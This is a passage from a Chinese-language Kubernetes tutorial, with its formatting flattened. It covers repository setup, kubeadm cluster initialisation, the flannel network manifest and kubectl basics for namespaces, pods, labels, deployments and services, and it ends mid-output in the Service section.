1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[docker-ce-stable]name=Docker CE Stable - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stableenabled=1gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-stable-debuginfo]name=Docker CE Stable - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stableenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-stable-source]name=Docker CE Stable - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stableenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test]name=Docker CE Test - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test-debuginfo]name=Docker CE Test - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-test-source]name=Docker CE Test - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/testenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly]name=Docker CE Nightly - $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly-debuginfo]name=Docker CE Nightly - Debuginfo $basearchbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg[docker-ce-nightly-source]name=Docker CE Nightly - Sourcesbaseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightlyenabled=0gpgcheck=1gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg 安装 Kubeadm （所有节点都要操作）123456789101112cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpghttp://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOFyum install -y kubelet kubeadm kubectl &amp;&amp; systemctl enable kubelet 部署Kubernetes Master初始化主节点（主节点操作）1234567kubeadm init --apiserver-advertise-address=192.168.5.3 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.1 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config 加入主节点以及其余工作节点12kubeadm join 192.168.5.3:6443 --token h0uelc.l46qp29nxscke7f7 \\ --discovery-token-ca-cert-hash sha256:abc807778e24bff73362ceeb783cc7f6feec96f20b4fd707c3f8e8312294e28f 部署网络1kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 下边是文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223---apiVersion: policy/v1beta1kind: PodSecurityPolicymetadata: name: psp.flannel.unprivileged annotations: seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/defaultspec: privileged: false volumes: - configMap - secret - emptyDir - hostPath allowedHostPaths: - pathPrefix: &quot;/etc/cni/net.d&quot; - pathPrefix: &quot;/etc/kube-flannel&quot; - pathPrefix: &quot;/run/flannel&quot; readOnlyRootFilesystem: false # Users and groups runAsUser: rule: RunAsAny supplementalGroups: rule: RunAsAny fsGroup: rule: RunAsAny # Privilege Escalation allowPrivilegeEscalation: false defaultAllowPrivilegeEscalation: false # Capabilities allowedCapabilities: ['NET_ADMIN', 'NET_RAW'] defaultAddCapabilities: [] requiredDropCapabilities: [] # Host namespaces hostPID: false hostIPC: false hostNetwork: true hostPorts: - min: 0 max: 65535 # SELinux seLinux: # SELinux is unused in CaaSP rule: 'RunAsAny'---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata: name: flannelrules:- apiGroups: ['extensions'] resources: ['podsecuritypolicies'] verbs: ['use'] resourceNames: ['psp.flannel.unprivileged']- apiGroups: - &quot;&quot; resources: - pods verbs: - get- apiGroups: - &quot;&quot; resources: - nodes verbs: - list - watch- apiGroups: - &quot;&quot; resources: - nodes/status verbs: - patch---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata: name: flannelroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: flannelsubjects:- kind: ServiceAccount name: flannel namespace: kube-system---apiVersion: v1kind: ServiceAccountmetadata: name: flannel namespace: kube-system---kind: ConfigMapapiVersion: v1metadata: name: kube-flannel-cfg namespace: kube-system labels: tier: node app: flanneldata: cni-conf.json: | { &quot;name&quot;: &quot;cbr0&quot;, &quot;cniVersion&quot;: &quot;0.3.1&quot;, &quot;plugins&quot;: [ { &quot;type&quot;: &quot;flannel&quot;, &quot;delegate&quot;: { &quot;hairpinMode&quot;: true, &quot;isDefaultGateway&quot;: true } }, { &quot;type&quot;: &quot;portmap&quot;, &quot;capabilities&quot;: { &quot;portMappings&quot;: true } } ] } net-conf.json: | { &quot;Network&quot;: &quot;10.244.0.0/16&quot;, &quot;Backend&quot;: { &quot;Type&quot;: &quot;vxlan&quot; } }---apiVersion: apps/v1kind: DaemonSetmetadata: name: kube-flannel-ds namespace: kube-system labels: tier: node app: flannelspec: selector: matchLabels: app: flannel template: metadata: labels: tier: node app: flannel spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/os operator: In values: - linux hostNetwork: true priorityClassName: system-node-critical tolerations: - operator: Exists effect: NoSchedule serviceAccountName: flannel initContainers: - name: install-cni image: quay.io/coreos/flannel:v0.14.0 command: - cp args: - -f - /etc/kube-flannel/cni-conf.json - /etc/cni/net.d/10-flannel.conflist volumeMounts: - name: cni mountPath: /etc/cni/net.d - name: flannel-cfg mountPath: /etc/kube-flannel/ containers: - name: kube-flannel image: quay.io/coreos/flannel:v0.14.0 command: - /opt/bin/flanneld args: - --ip-masq - --kube-subnet-mgr resources: requests: cpu: &quot;100m&quot; memory: &quot;50Mi&quot; limits: cpu: &quot;100m&quot; memory: &quot;50Mi&quot; securityContext: privileged: false capabilities: add: [&quot;NET_ADMIN&quot;, &quot;NET_RAW&quot;] env: - name: POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: POD_NAMESPACE valueFrom: fieldRef: fieldPath: metadata.namespace volumeMounts: - name: run mountPath: /run/flannel - name: flannel-cfg mountPath: /etc/kube-flannel/ volumes: - name: run hostPath: path: /run/flannel - name: cni hostPath: path: /etc/cni/net.d - name: flannel-cfg configMap: name: kube-flannel-cfg 测试kubernetes 集群部署nginx 测试123456#部署kubectl create deployment nginx --image=nginx#暴露端口kubectl expose deployment nginx --port=80 --type=NodePort#查看服务器状态kubectl get pod,svc 资源管理资源管理介绍在kubernetes中，所有的内容都抽象为资源，用户需要通过操作资源来管理kubernetes。 kubernetes的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在kubernetes集群中运行一个个的容器，并将指定的程序跑在容器中。 kubernetes的最小管理单元是pod而不是容器，所以只能将容器放在Pod中，而kubernetes一般也不会直接管理Pod，而是通过Pod控制器来管理Pod的。 Pod可以提供服务之后，就要考虑如何访问Pod中服务，kubernetes提供了Service资源实现这个功能。 当然，如果Pod中程序的数据需要持久化，kubernetes还提供了各种存储系统。 学习kubernetes的核心，就是学习如何对集群上的Pod、Pod控制器、Service、存储等各种资源进行操作 3.2 YAML语言介绍YAML是一个类似 XML、JSON 的标记性语言。它强调以数据为中心，并不是以标识语言为重点。因而YAML本身的定义比较简单，号称”一种人性化的数据格式语言”。 1234&lt;heima&gt; &lt;age&gt;15&lt;/age&gt; &lt;address&gt;Beijing&lt;/address&gt;&lt;/heima&gt; 123heima: age: 15 address: Beijing YAML的语法比较简单，主要有下面几个： 大小写敏感 使用缩进表示层级关系 缩进不允许使用tab，只允许空格( 低版本限制 ) 缩进的空格数不重要，只要相同层级的元素左对齐即可 ‘#’表示注释 YAML支持以下几种数据类型： 纯量：单个的、不可再分的值 对象：键值对的集合，又称为映射（mapping）/ 哈希（hash） / 字典（dictionary） 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list） 1234567891011121314151617# 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、Null、时间、日期# 1 布尔类型c1: true (或者True)# 2 整型c2: 234# 3 浮点型c3: 3.14# 4 null类型 c4: ~ # 使用~表示null# 5 日期类型c5: 2018-02-17 # 日期必须使用ISO 8601格式，即yyyy-MM-dd# 6 时间类型c6: 2018-02-17T15:02:31+08:00 # 时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区# 7 字符串类型c7: heima # 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 c8: line1 line2 # 字符串过多的情况可以拆成多行，每一行会被转化成一个空格 1234567# 对象# 形式一(推荐):heima: age: 15 address: Beijing# 形式二(了解):heima: {age: 15,address: Beijing} 1234567# 数组# 形式一(推荐):address: - 顺义 - 昌平 # 形式二(了解):address: [顺义,昌平] 小提示： 1 书写yaml切记: 后面要加一个空格 2 如果需要将多段yaml配置放在一个文件中，中间要使用---分隔 3 下面是一个yaml转json的网站，可以通过它验证yaml是否书写正确 https://www.json2yaml.com/convert-yaml-to-json 3.3 资源管理方式 命令式对象管理：直接使用命令去操作kubernetes资源 kubectl run nginx-pod --image=nginx:1.17.1 --port=80 命令式对象配置：通过命令配置和配置文件去操作kubernetes资源 kubectl create/patch -f nginx-pod.yaml 声明式对象配置：通过apply命令和配置文件去操作kubernetes资源 kubectl apply -f nginx-pod.yaml 类型 操作对象 适用环境 优点 缺点 命令式对象管理 对象 测试 简单 只能操作活动对象，无法审计、跟踪 命令式对象配置 文件 开发 可以审计、跟踪 项目大时，配置文件多，操作麻烦 声明式对象配置 目录 开发 支持目录操作 意外情况下难以调试 3.3.1 命令式对象管理kubectl命令 kubectl是kubernetes集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl命令的语法如下： 1kubectl [command] [type] [name] [flags] comand：指定要对资源执行的操作，例如create、get、delete type：指定资源类型，比如deployment、pod、service name：指定资源的名称，名称大小写敏感 flags：指定额外的可选参数 12345678# 查看所有podkubectl get pod # 查看某个podkubectl get pod pod_name# 查看某个pod,以yaml格式展示结果kubectl get pod pod_name -o yaml 资源类型 kubernetes中所有的内容都抽象为资源，可以通过下面的命令进行查看: 1kubectl api-resources 经常使用的资源有下面这些： 资源分类 资源名称 缩写 资源作用 集群级别资源 nodes no 集群组成部分 namespaces ns 隔离Pod pod资源 pods po 装载容器 pod资源控制器 replicationcontrollers rc 控制pod资源 replicasets rs 控制pod资源 deployments deploy 控制pod资源 daemonsets ds 控制pod资源 jobs 控制pod资源 cronjobs cj 控制pod资源 horizontalpodautoscalers hpa 控制pod资源 statefulsets sts 控制pod资源 服务发现资源 services svc 统一pod对外接口 ingress ing 统一pod对外接口 存储资源 volumeattachments 存储 persistentvolumes pv 存储 persistentvolumeclaims pvc 存储 配置资源 configmaps cm 配置 secrets 配置 操作 kubernetes允许对资源进行多种操作，可以通过–help查看详细的操作命令 1kubectl --help 经常使用的操作有下面这些： 命令分类 命令 翻译 命令作用 基本命令 create 创建 创建一个资源 edit 编辑 编辑一个资源 get 获取 获取一个资源 patch 更新 更新一个资源 delete 删除 删除一个资源 explain 解释 展示资源文档 运行和调试 run 运行 在集群中运行一个指定的镜像 expose 暴露 暴露资源为Service describe 描述 显示资源内部信息 logs 日志输出容器在 pod 中的日志 输出容器在 pod 中的日志 attach 缠绕进入运行中的容器 进入运行中的容器 exec 执行容器中的一个命令 执行容器中的一个命令 cp 复制 在Pod内外复制文件 rollout 首次展示 管理资源的发布 scale 规模 扩(缩)容Pod的数量 autoscale 自动调整 自动调整Pod的数量 高级命令 apply rc 通过文件对资源进行配置 label 标签 更新资源上的标签 其他命令 cluster-info 集群信息 显示集群信息 version 版本 显示当前Server和Client的版本 下面以一个namespace / pod的创建和删除简单演示下命令的使用： 123456789101112131415161718192021222324252627282930# 创建一个namespace[root@master ~]# kubectl create namespace devnamespace/dev created# 获取namespace[root@master ~]# kubectl get nsNAME STATUS AGEdefault Active 21hdev Active 21skube-node-lease Active 21hkube-public Active 21hkube-system Active 21h# 在此namespace下创建并运行一个nginx的Pod[root@master ~]# kubectl run pod --image=nginx:latest -n devkubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.deployment.apps/pod created# 查看新创建的pod[root@master ~]# kubectl get pod -n devNAME READY STATUS RESTARTS AGEpod 1/1 Running 0 21s# 删除指定的pod[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7xpod &quot;pod&quot; deleted# 删除指定的namespace[root@master ~]# kubectl delete ns devnamespace &quot;dev&quot; deleted 3.3.2 命令式对象配置命令式对象配置就是使用命令配合配置文件一起来操作kubernetes资源。 1） 创建一个nginxpod.yaml，内容如下： 12345678910111213141516apiVersion: v1kind: Namespacemetadata: name: dev---apiVersion: v1kind: Podmetadata: name: nginxpod namespace: devspec: containers: - name: nginx-containers image: nginx:latest 2）执行create命令，创建资源： 123[root@master ~]# kubectl create -f nginxpod.yamlnamespace/dev createdpod/nginxpod created 此时发现创建了两个资源对象，分别是namespace和pod 3）执行get命令，查看资源： 123456[root@master ~]# kubectl get -f nginxpod.yamlNAME STATUS AGEnamespace/dev Active 18sNAME READY STATUS RESTARTS AGEpod/nginxpod 1/1 Running 0 17s 这样就显示了两个资源对象的信息 4）执行delete命令，删除资源： 123[root@master ~]# kubectl delete -f nginxpod.yamlnamespace &quot;dev&quot; deletedpod &quot;nginxpod&quot; deleted 此时发现两个资源对象被删除了 12总结: 命令式对象配置的方式操作资源，可以简单的认为：命令 + yaml配置文件（里面是命令需要的各种参数） 3.3.3 声明式对象配置声明式对象配置跟命令式对象配置很相似，但是它只有一个命令apply。 123456789# 首先执行一次kubectl apply -f yaml文件，发现创建了资源[root@master ~]# kubectl apply -f nginxpod.yamlnamespace/dev createdpod/nginxpod created# 再次执行一次kubectl apply -f yaml文件，发现说资源没有变动[root@master ~]# kubectl apply -f nginxpod.yamlnamespace/dev unchangedpod/nginxpod unchanged 12345总结: 其实声明式对象配置就是使用apply描述一个资源最终的状态（在yaml中定义状态） 使用apply操作资源： 如果资源不存在，就创建，相当于 kubectl create 如果资源已存在，就更新，相当于 kubectl patch 扩展：kubectl可以在node节点上运行吗 ? kubectl的运行是需要进行配置的，它的配置文件是$HOME/.kube，如果想要在node节点运行此命令，需要将master上的.kube文件复制到node节点上，即在master节点上执行下面操作： 1scp -r HOME/.kube node1: HOME/ 使用推荐: 三种方式应该怎么用 ? 创建/更新资源 使用声明式对象配置 kubectl apply -f XXX.yaml 删除资源 使用命令式对象配置 kubectl delete -f XXX.yaml 查询资源 使用命令式对象管理 kubectl get(describe) 资源名称 实战本章节将介绍如何在kubernetes集群中部署一个nginx服务，并且能够对其进行访问。 NamespaceNamespace是kubernetes系统中的一种非常重要资源，它的主要作用是用来实现多套环境的资源隔离或者多租户的资源隔离。 默认情况下，kubernetes集群中的所有的Pod都是可以相互访问的。但是在实际中，可能不想让两个Pod之间进行互相的访问，那此时就可以将两个Pod划分到不同的namespace下。kubernetes通过将集群内部的资源分配到不同的Namespace中，可以形成逻辑上的”组”，以方便不同的组的资源进行隔离使用和管理。 可以通过kubernetes的授权机制，将不同的namespace交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合kubernetes的资源配额机制，限定不同租户能占用的资源，例如CPU使用量、内存使用量等等，来实现租户可用资源的管理。 kubernetes在集群启动之后，会默认创建几个namespace 123456[root@master ~]# kubectl get namespaceNAME STATUS AGEdefault Active 45h # 所有未指定Namespace的对象都会被分配在default命名空间kube-node-lease Active 45h # 集群节点之间的心跳维护，v1.13开始引入kube-public Active 45h # 此命名空间下的资源可以被所有人访问（包括未认证用户）kube-system Active 45h # 所有由Kubernetes系统创建的资源都处于这个命名空间 下面来看namespace资源的具体操作： 查看 1234567891011121314151617181920212223242526272829303132333435363738394041# 1 查看所有的ns 命令：kubectl get ns[root@master ~]# kubectl get nsNAME STATUS AGEdefault Active 45hkube-node-lease Active 45hkube-public Active 45h kube-system Active 45h # 2 查看指定的ns 命令：kubectl get ns ns名称[root@master ~]# kubectl get ns defaultNAME STATUS AGEdefault Active 45h# 3 指定输出格式 命令：kubectl get ns ns名称 -o 格式参数# kubernetes支持的格式有很多，比较常见的是wide、json、yaml[root@master ~]# kubectl get ns default -o yamlapiVersion: v1kind: Namespacemetadata: creationTimestamp: &quot;2021-05-08T04:44:16Z&quot; name: default resourceVersion: &quot;151&quot; selfLink: /api/v1/namespaces/default uid: 7405f73a-e486-43d4-9db6-145f1409f090spec: finalizers: - kubernetesstatus: phase: Active # 4 查看ns详情 命令：kubectl describe ns ns名称[root@master ~]# kubectl describe ns defaultName: defaultLabels: &lt;none&gt;Annotations: &lt;none&gt;Status: Active # Active 命名空间正在使用中 Terminating 正在删除命名空间# ResourceQuota 针对namespace做的资源限制# LimitRange针对namespace中的每个组件做的资源限制No resource quota.No LimitRange resource. 创建 123# 创建namespace[root@master ~]# kubectl create ns devnamespace/dev created 删除 123# 删除namespace[root@master ~]# kubectl delete ns devnamespace &quot;dev&quot; deleted 配置方式 首先准备一个yaml文件：ns-dev.yaml 1234apiVersion: v1kind: Namespacemetadata: name: dev 然后就可以执行对应的创建和删除命令了： 创建：kubectl create -f ns-dev.yaml 删除：kubectl delete -f ns-dev.yaml PodPod是kubernetes集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于Pod中。 Pod可以认为是容器的封装，一个Pod中可以存在一个或者多个容器。 kubernetes在集群启动之后，集群中的各个组件也都是以Pod方式运行的。可以通过下面命令查看： 123456789101112[root@master ~]# kubectl get pod -n kube-systemNAMESPACE NAME READY STATUS RESTARTS AGEkube-system coredns-6955765f44-68g6v 1/1 Running 0 2d1hkube-system coredns-6955765f44-cs5r8 1/1 Running 0 2d1hkube-system etcd-master 1/1 Running 0 2d1hkube-system kube-apiserver-master 1/1 Running 0 2d1hkube-system kube-controller-manager-master 1/1 Running 0 2d1hkube-system kube-flannel-ds-amd64-47r25 1/1 Running 0 2d1hkube-system kube-flannel-ds-amd64-ls5lh 1/1 Running 0 2d1hkube-system kube-proxy-685tk 1/1 Running 0 2d1hkube-system kube-proxy-87spt 1/1 Running 0 2d1hkube-system kube-scheduler-master 1/1 Running 0 2d1h 创建并运行 kubernetes没有提供单独运行Pod的命令，都是通过Pod控制器来实现的 123456# 命令格式： kubectl run (pod控制器名称) [参数] # --image 指定Pod的镜像# --port 指定端口# --namespace 指定namespace[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev deployment.apps/nginx created 查看pod信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# 查看Pod基本信息[root@master ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEnginx 1/1 Running 0 43s# 查看Pod的详细信息[root@master ~]# kubectl describe pod nginx -n devName: nginxNamespace: devPriority: 0Node: node1/192.168.5.4Start Time: Wed, 08 May 2021 09:29:24 +0800Labels: pod-template-hash=5ff7956ff6 run=nginxAnnotations: &lt;none&gt;Status: RunningIP: 10.244.1.23IPs: IP: 10.244.1.23Controlled By: ReplicaSet/nginxContainers: nginx: Container ID: docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c Image: nginx:latest Image ID: docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7 Port: 80/TCP Host Port: 0/TCP State: Running Started: Wed, 08 May 2021 09:30:01 +0800 Ready: True Restart Count: 0 Environment: &lt;none&gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled TrueVolumes: default-token-hwvvw: Type: Secret (a volume populated by a Secret) SecretName: default-token-hwvvw Optional: falseQoS Class: BestEffortNode-Selectors: &lt;none&gt;Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s node.kubernetes.io/unreachable:NoExecute for 300sEvents: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled &lt;unknown&gt; default-scheduler Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1 Normal Pulling 4m11s kubelet, node1 Pulling image &quot;nginx:latest&quot; Normal Pulled 3m36s kubelet, node1 Successfully pulled image &quot;nginx:latest&quot; Normal Created 3m36s kubelet, node1 Created container nginx Normal Started 3m36s kubelet, node1 Started container nginx 访问Pod 12345678910111213141516# 获取podIP[root@master ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ... nginx 1/1 Running 0 190s 10.244.1.23 node1 ...#访问POD[root@master ~]# curl http://10.244.1.23:80&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 删除指定Pod 123456789101112131415161718192021222324# 删除指定Pod[root@master ~]# kubectl delete pod nginx -n devpod &quot;nginx&quot; deleted# 此时，显示删除Pod成功，但是再查询，发现又新产生了一个 [root@master ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEnginx 1/1 Running 0 21s# 这是因为当前Pod是由Pod控制器创建的，控制器会监控Pod状况，一旦发现Pod死亡，会立即重建# 此时要想删除Pod，必须删除Pod控制器# 先来查询一下当前namespace下的Pod控制器[root@master ~]# kubectl get deploy -n devNAME READY UP-TO-DATE AVAILABLE AGEnginx 1/1 1 1 9m7s# 接下来，删除此PodPod控制器[root@master ~]# kubectl delete deploy nginx -n devdeployment.apps &quot;nginx&quot; deleted# 稍等片刻，再查询Pod，发现Pod被删除了[root@master ~]# kubectl get pods -n devNo resources found in dev namespace. 配置操作 创建一个pod-nginx.yaml，内容如下： 12345678910111213apiVersion: v1kind: Podmetadata: name: nginx namespace: devspec: containers: - image: nginx:latest name: pod ports: - name: nginx-port containerPort: 80 protocol: TCP 然后就可以执行对应的创建和删除命令了： 创建：kubectl create -f pod-nginx.yaml 删除：kubectl delete -f pod-nginx.yaml LabelLabel是kubernetes系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。 Label的特点： 一个Label会以key/value键值对的形式附加到各种对象上，如Node、Pod、Service等等 一个资源对象可以定义任意数量的Label ，同一个Label也可以被添加到任意数量的资源对象上去 Label通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除 可以通过Label实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。 一些常用的Label 示例如下： 版本标签：”version”:”release”, “version”:”stable”…… 环境标签：”environment”:”dev”，”environment”:”test”，”environment”:”pro” 架构标签：”tier”:”frontend”，”tier”:”backend” 标签定义完毕之后，还要考虑到标签的选择，这就要使用到Label Selector，即： Label用于给某个资源对象定义标识 Label Selector用于查询和筛选拥有某些标签的资源对象 当前有两种Label Selector： 基于等式的Label Selector name = slave: 选择所有包含Label中key=”name”且value=”slave”的对象 env != production: 选择所有包括Label中的key=”env”且value不等于”production”的对象 基于集合的Label Selector name in (master, slave): 选择所有包含Label中的key=”name”且value=”master”或”slave”的对象 name not in (frontend): 选择所有包含Label中的key=”name”且value不等于”frontend”的对象 标签的选择条件可以使用多个，此时将多个Label Selector进行组合，使用逗号”,”进行分隔即可。例如： name=slave，env!=production name not in (frontend)，env!=production 命令方式 1234567891011121314151617181920212223# 为pod资源打标签[root@master ~]# kubectl label pod nginx-pod version=1.0 -n devpod/nginx-pod labeled# 为pod资源更新标签[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwritepod/nginx-pod labeled# 查看标签[root@master ~]# kubectl get pod nginx-pod -n dev --show-labelsNAME READY STATUS RESTARTS AGE LABELSnginx-pod 1/1 Running 0 10m version=2.0# 筛选标签[root@master ~]# kubectl get pod -n dev -l version=2.0 --show-labelsNAME READY STATUS RESTARTS AGE LABELSnginx-pod 1/1 Running 0 17m version=2.0[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labelsNo resources found in dev namespace.#删除标签[root@master ~]# kubectl label pod nginx-pod version- -n devpod/nginx-pod labeled 配置方式 12345678910111213141516apiVersion: v1kind: Podmetadata: name: nginx namespace: dev labels: version: &quot;3.0&quot; env: &quot;test&quot;spec: containers: - image: nginx:latest name: pod ports: - name: nginx-port containerPort: 80 protocol: TCP 然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml Deployment在kubernetes中，Pod是最小的控制单元，但是kubernetes很少直接控制Pod，一般都是通过Pod控制器来完成的。Pod控制器用于pod的管理，确保pod资源符合预期的状态，当pod的资源出现故障时，会尝试进行重启或重建pod。 在kubernetes中Pod控制器的种类有很多，本章节只介绍一种：Deployment。 命令操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# 命令格式: kubectl create deployment 名称 [参数] # --image 指定pod的镜像# --port 指定端口# --replicas 指定创建pod数量# --namespace 指定namespace[root@master ~]# kubectl create deploy nginx --image=nginx:latest --port=80 --replicas=3 -n devdeployment.apps/nginx created# 查看创建的Pod[root@master ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEnginx-5ff7956ff6-6k8cb 1/1 Running 0 19snginx-5ff7956ff6-jxfjt 1/1 Running 0 19snginx-5ff7956ff6-v6jqw 1/1 Running 0 19s# 查看deployment的信息[root@master ~]# kubectl get deploy -n devNAME READY UP-TO-DATE AVAILABLE AGEnginx 3/3 3 3 2m42s# UP-TO-DATE：成功升级的副本数量# AVAILABLE：可用副本的数量[root@master ~]# kubectl get deploy -n dev -o wideNAME READY UP-TO-DATE AVAILABLE AGE CONTAINERS IMAGES SELECTORnginx 3/3 3 3 2m51s nginx nginx:latest run=nginx# 查看deployment的详细信息[root@master ~]# kubectl describe deploy nginx -n devName: nginxNamespace: devCreationTimestamp: Wed, 08 May 2021 11:14:14 +0800Labels: run=nginxAnnotations: deployment.kubernetes.io/revision: 1Selector: run=nginxReplicas: 3 desired | 3 updated | 3 total | 3 available | 0 unavailableStrategyType: RollingUpdateMinReadySeconds: 0RollingUpdateStrategy: 25% max unavailable, 25% max surgePod Template: Labels: run=nginx Containers: nginx: Image: nginx:latest Port: 80/TCP Host Port: 0/TCP Environment: &lt;none&gt; Mounts: &lt;none&gt; Volumes: &lt;none&gt;Conditions: Type Status Reason ---- ------ ------ Available True MinimumReplicasAvailable Progressing True NewReplicaSetAvailableOldReplicaSets: &lt;none&gt;NewReplicaSet: nginx-5ff7956ff6 (3/3 replicas created)Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal ScalingReplicaSet 5m43s deployment-controller Scaled up replicaset nginx-5ff7956ff6 to 3 # 删除 [root@master ~]# kubectl delete deploy nginx -n devdeployment.apps &quot;nginx&quot; deleted 配置操作 创建一个deploy-nginx.yaml，内容如下： 123456789101112131415161718192021apiVersion: apps/v1kind: Deploymentmetadata: name: nginx namespace: devspec: replicas: 3 selector: matchLabels: run: nginx template: metadata: labels: run: nginx spec: containers: - image: nginx:latest name: nginx ports: - containerPort: 80 protocol: TCP 然后就可以执行对应的创建和删除命令了： 创建：kubectl create -f deploy-nginx.yaml 删除：kubectl delete -f deploy-nginx.yaml Service通过上节课的学习，已经能够利用Deployment来创建一组Pod来提供具有高可用性的服务。 虽然每个Pod都会分配一个单独的Pod IP，然而却存在如下两问题： Pod IP 会随着Pod的重建产生变化 Pod IP 仅仅是集群内可见的虚拟IP，外部无法访问 这样对于访问这个服务带来了难度。因此，kubernetes设计了Service来解决这个问题。 Service可以看作是一组同类Pod对外的访问接口。借助Service，应用可以方便地实现服务发现和负载均衡。 操作一：创建集群内部可访问的Service 12345678910111213141516171819202122# 暴露Service[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n devservice/svc-nginx1 exposed# 查看service[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORsvc-nginx1 ClusterIP 10.109.179.231 &lt;none&gt; 80/TCP 3m51s run=nginx# 这里产生了一个CLUSTER-IP，这就是service的IP，在Service的生命周期中，这个地址是不会变动的# 可以通过这个IP访问当前service对应的POD[root@master ~]# curl 10.109.179.231:80&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to 